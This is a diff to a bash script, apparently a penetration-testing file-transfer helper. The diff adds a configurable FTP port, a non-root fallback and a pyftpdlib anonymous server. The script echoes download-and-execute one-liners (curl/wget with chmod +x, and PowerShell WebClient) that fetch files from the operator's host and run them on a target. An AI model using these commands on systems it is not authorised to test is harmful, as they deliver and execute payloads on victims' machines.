@@ -7,6 +7,7 @@ set -euo pipefail
 PORT=80
 HTTPS_PORT=443
 WEBDAV_PORT=8080
+FTP_PORT=21
 INTERFACE=""
 VSFTPD_CONF=""
 
@@ -188,8 +189,16 @@ if [[ "$PROTOCOL" == "HTTPS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
   fi
 fi
 
-if [[ "$PROTOCOL" != "HTTP" && "$PROTOCOL" != "WebDAV" ]] && [[ "$EUID" -ne 0 ]]; then
-  echo "WARNING: SMB (445), FTP (21), TFTP (69), and DNS (53) usually require root privileges."
+if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+  if [[ "$FTP_PORT" -eq 21 ]] && [[ "$EUID" -ne 0 ]]; then
+    echo "WARNING: Port $FTP_PORT is privileged and you are not root."
+    FTP_PORT=2121
+    echo "Falling back to port $FTP_PORT for FTP."
+  fi
+fi
+
+if [[ "$PROTOCOL" != "HTTP" && "$PROTOCOL" != "HTTPS" && "$PROTOCOL" != "FTP" && "$PROTOCOL" != "WebDAV" ]] && [[ "$EUID" -ne 0 ]]; then
+  echo "WARNING: SMB (445), TFTP (69), and DNS (53) usually require root privileges."
 fi
 
 # Print download commands per file
@@ -221,8 +230,8 @@ else
       fi
       if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Linux (FTP):"
-        echo "    curl -u anonymous: \"ftp://$LOCAL_IP/$url_encoded\" -o \"$f\" && chmod +x \"$f\" && ./\"$f\""
-        echo "    wget \"ftp://$LOCAL_IP/$url_encoded\" -O \"$f\" && chmod +x \"$f\" && ./\"$f\""
+        echo "    curl -u anonymous: \"ftp://$LOCAL_IP:$FTP_PORT/$url_encoded\" -o \"$f\" && chmod +x \"$f\" && ./\"$f\""
+        echo "    wget \"ftp://$LOCAL_IP:$FTP_PORT/$url_encoded\" -O \"$f\" && chmod +x \"$f\" && ./\"$f\""
       fi
       if [[ "$PROTOCOL" == "TFTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Linux (TFTP):"
@@ -258,8 +267,8 @@ else
       fi
       if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Windows (FTP):"
-        echo "    curl.exe \"ftp://$LOCAL_IP/$url_encoded\" -o \"$f\" && .\\\"$f\""
-        echo "    PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('ftp://$LOCAL_IP/$f', '$f'); .\\'$f'\""
+        echo "    curl.exe \"ftp://$LOCAL_IP:$FTP_PORT/$url_encoded\" -o \"$f\" && .\\\"$f\""
+        echo "    PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('ftp://$LOCAL_IP:$FTP_PORT/$url_encoded', '$f'); .\\'$f'\""
       fi
       if [[ "$PROTOCOL" == "TFTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Windows (TFTP):"
@@ -341,9 +350,13 @@ start_smb() {
 }
 
 start_ftp() {
-  if command -v vsftpd >/dev/null 2>&1; then
+  if python3 -m pyftpdlib --help >/dev/null 2>&1; then
+    echo "Starting python3 pyftpdlib on port $FTP_PORT (anonymous root: $(pwd))"
+    python3 -m pyftpdlib -p "$FTP_PORT" -d "$(pwd)" -u anonymous -P ""
+  elif command -v vsftpd >/dev/null 2>&1; then
     VSFTPD_CONF="/tmp/vsftpd.conf.$$"
     echo "listen=YES
+listen_port=$FTP_PORT
 listen_ipv6=NO
 anonymous_enable=YES
 anon_root=$(pwd)
@@ -352,10 +365,13 @@ write_enable=NO
 pasv_enable=YES
 background=NO
 seccomp_sandbox=NO" > "$VSFTPD_CONF"
-    echo "Starting vsftpd on port 21 (anonymous root: $(pwd))"
+    echo "Starting vsftpd on port $FTP_PORT (anonymous root: $(pwd))"
+    if [[ "$EUID" -ne 0 ]]; then
+      echo "WARNING: vsftpd might fail if not run as root, even on high ports."
+    fi
     vsftpd "$VSFTPD_CONF"
   else
-    echo "ERROR: 'vsftpd' not found. (apt install vsftpd)"
+    echo "ERROR: Neither 'pyftpdlib' nor 'vsftpd' was found. (pip install pyftpdlib OR apt install vsftpd)"
     return 1
   fi
 }
@@ -397,12 +413,12 @@ if command -v fuser >/dev/null 2>&1; then
     HTTP) fuser -k "$PORT/tcp" 2>/dev/null || true ;;
     HTTPS) fuser -k "$HTTPS_PORT/tcp" 2>/dev/null || true ;;
     SMB)  fuser -k 445/tcp 2>/dev/null || true ;;
-    FTP)  fuser -k 21/tcp 2>/dev/null || true ;;
+    FTP)  fuser -k "$FTP_PORT/tcp" 2>/dev/null || true ;;
     TFTP) fuser -k 69/udp 2>/dev/null || true ;;
     WebDAV) fuser -k "$WEBDAV_PORT/tcp" 2>/dev/null || true ;;
     DNS)  fuser -k 53/udp 53/tcp 2>/dev/null || true ;;
     ALL)
-      fuser -k "$PORT/tcp" "$HTTPS_PORT/tcp" 445/tcp 21/tcp 69/udp "$WEBDAV_PORT/tcp" 53/udp 53/tcp 2>/dev/null || true
+      fuser -k "$PORT/tcp" "$HTTPS_PORT/tcp" 445/tcp "$FTP_PORT/tcp" 69/udp "$WEBDAV_PORT/tcp" 53/udp 53/tcp 2>/dev/null || true
       ;;
   esac
   sleep 0.5 # Give the OS a moment to release the sockets
